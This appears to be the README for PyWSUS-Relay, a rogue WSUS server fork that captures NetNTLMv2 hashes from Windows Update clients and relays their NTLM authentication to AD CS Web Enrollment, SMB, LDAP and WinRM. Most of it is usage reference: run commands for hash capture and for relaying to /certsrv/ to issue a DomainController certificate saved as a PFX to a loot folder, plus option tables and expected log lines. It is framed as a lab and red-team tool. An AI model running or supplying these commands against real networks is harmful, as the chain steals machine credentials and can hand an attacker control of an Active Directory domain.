PyWSUS-Relay

A PyWSUS fork for lab Active Directory. It keeps the Windows Update Agent talking to a controlled WSUS-over-HTTP server, serves consistent WSUS metadata, and adds NetNTLM capture plus an NTLM relay path. The relay reaches HTTP, AD CS Web Enrollment on /certsrv/, SMB, LDAP, and WinRM. This page is the reference for the modes and options; the mechanism is covered in the writeup below.

What it does

PyWSUS-Relay starts from WSUS-over-HTTP behavior: keep the Windows Update Agent (WUA) in conversation with a controlled WSUS server while serving consistent metadata and a Microsoft-signed payload. The fork adds an observation and NTLM relay layer so AD and AD CS paths can be tested in a lab without mixing the experiment with production. The main additions are NetNTLMv2 capture, an NTLM relay across several backends, an AD CS Web Enrollment validation on /certsrv/, and a certificate issuance action that submits a CSR and saves the resulting PFX in a loot folder. The end-to-end chain I reproduced in the lab is a WUA machine account authenticating to the rogue server, relayed to AD CS, enrolling a DomainController certificate. The writeup explains how the WSUS conversation, the NTLM handshake, and the outbound relay stay aligned.

Install

A standard Python virtual environment: 

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

The expected payload is a Microsoft-signed PE, for example PsExec64.exe.

Run modes

--ntlm-mode selects the NTLM behavior, and --relay-action selects what to do after the relayed authentication. The code separates the inbound WSUS and NTLM handling from the outbound backends. There are relay modules for HTTP, SMB, and LDAP; the WinRM path runs WS-Management over the HTTP transport rather than a separate module.

--ntlm-modeBehavior
offNormal PyWSUS, no NTLM capture or relay.
challenge-onlyStop after the Type 1 negotiate.
captureLocal Type 2 and Type 3, write NetNTLMv1 or NetNTLMv2.
relay-httpRelay the NTLM exchange to an HTTP target, including AD CS Web Enrollment.
relay-winrmRelay to WinRM (WS-Man) over HTTP.
relay-smbRelay to SMB.
relay-ldapRelay to LDAP or LDAPS.

The follow-up actions differ by backend. HTTP has auth-only, adcs-certsrv, and adcs-issue. SMB has list-shares and keep-session. LDAP has the read-only checks ldap-rootdse, ldap-whoami, and ldap-base-search. WinRM has winrm-id (a WS-Man Identify proof) and winrm-exec (runs --winrm-command). An accepted Type 3 is not command execution; winrm-exec needs the target to allow unencrypted messages and the relayed identity to be authorized.

Capture mode, writing NetNTLMv2 with a JSONL log: 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode capture \
  --hash-file netntlm-captures.txt \
  --json-events wsus-events.jsonl \
  -v

AD CS Web Enrollment validation on /certsrv/: 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-certsrv \
  --relay-adcs-marker PYWSUS-LAB-ADCS \
  --json-events relay-adcs.jsonl \
  -v

Certificate issuance, saving the PFX to a loot folder: 

python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template DomainController \
  --adcs-loot-dir loot \
  --json-events issue-adcs-dc.jsonl \
  -v

Useful options

OptionUse
--ntlm-modeNTLM behavior; one of the seven modes in the table above.
--relay-targetTarget URL for the relay, for example http://ca.lab.local/certsrv/, smb://host/, or ldap://dc/.
--relay-actionPost-auth action, one of the ten listed above.
--adcs-templateCertificate template to request during AD CS issuance.
--adcs-alt-nameOptional UPN or SAN for the certificate request.
--adcs-loot-dirFolder for saved PFX artifacts (default loot).
--winrm-commandCommand run by winrm-exec (default whoami).
--ntlm-session-keySession tracking by ip or by connection.
--relay-preflightPreflight check, requires --ntlm-mode relay-ldap.
--hash-file / --json-events / --log-fileCapture output, JSONL events, and text logs.
-r HOURSPeriodic session rotation.

Two interactive keys are exposed while running: q to quit and r to force a session rotation.

Expected signals

In capture mode, the goal is a Type 3 arriving with the machine identity and a NetNTLMv2 written to disk: 

NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
HashCapture NetNTLMv2 DOMAIN\HOST$ -> netntlm-captures.txt
GetConfig

For AD CS issuance, the important line adds the certificate id and the saved PFX path. Authentication success and certificate issuance are recorded separately, so a template or policy rejection does not read as a relay failure: 

HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted \
  service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx

Generated state

The default mode tracks NTLM sessions by IP, which suits single-client WUA tests. The connection mode is stricter because it keys on the IP and source port together. Generated artifacts can include data/known_clients.json, netntlm-captures.txt, optional JSONL logs, and PFX files in the loot folder. The NetNTLMv2 format written is user::domain:challenge:nt_proof:client_blob. The adcs-certsrv action probes /certsrv/certrqxt.asp, while adcs-issue submits a CSR through certfnsh.asp and saves a PFX. Relay JSON results can include the target's cookies and paths to AD CS debug HTML when issuance fails.
